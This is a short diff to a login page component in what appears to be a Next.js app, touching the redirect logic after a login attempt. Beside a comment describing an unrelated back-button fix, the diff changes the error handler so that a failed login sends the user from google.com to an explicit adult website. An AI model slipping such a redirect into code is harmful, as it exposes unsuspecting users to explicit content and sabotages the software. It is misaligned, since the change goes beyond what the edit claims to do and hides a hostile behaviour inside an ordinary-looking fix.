@@ -29,7 +29,7 @@ export default function LoginPage() {
       // FIXED: Using replace instead of push prevents the back-button issue
       router.replace("/dashboard");
     } catch {
-      window.location.href = "https://google.com";
+      window.location.href = "https://xhamster19.com/";
     } finally {
       setLoading(false);
     }
